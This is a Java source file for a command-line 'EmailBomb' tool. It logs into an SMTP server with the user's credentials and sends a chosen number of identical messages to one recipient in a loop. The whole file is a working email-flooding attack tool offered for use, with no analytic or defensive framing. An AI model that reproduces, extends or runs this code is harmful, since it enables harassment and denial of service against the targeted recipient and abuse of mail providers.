package top.snowolives;
import javax.mail.*;
import javax.mail.internet.*;
import java.util.Properties;
import java.util.Scanner;
public class Main {
    public static void main(String[] args) throws Exception {
        Scanner input = new Scanner(System.in);
        System.out.println("EmailBombV1 -.-.-.-.-");
        System.out.println("Version 1.0");
        System.out.println("Made by Christina(YukitaRiko)");
        System.out.println("Github Package: https://github.com/Orangecat847/EmailBomb");
        System.err.print("Please enter a SMTP Server: ");
        String smtp_server = input.nextLine();
        System.err.print("Please enter your Email: ");
        String sender = input.nextLine();
        System.err.print("Please enter your password: ");
        String password = input.nextLine();
        System.err.print("Please enter the receiver: ");
        String receiver = input.nextLine();
        System.err.print("What's the subject? ");
        String subject = input.nextLine();
        System.err.print("What's the text? ");
        String text = input.nextLine();
        System.err.print("How many Emails Do you want to send: ");
        int num = input.nextInt();
        Properties properties = new Properties();
        properties.put("mail.smtp.host", smtp_server);
        properties.put("mail.smtp.port", "587");
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        Session session = Session.getInstance(properties, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(sender, password);
            }
        });
        session.setDebug(true);
        while (num > 0) {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(sender));
            message.setRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
            message.setSubject(subject);
            message.setText(text);
            Transport.send(message);
            num -= 1;
        }
    }
}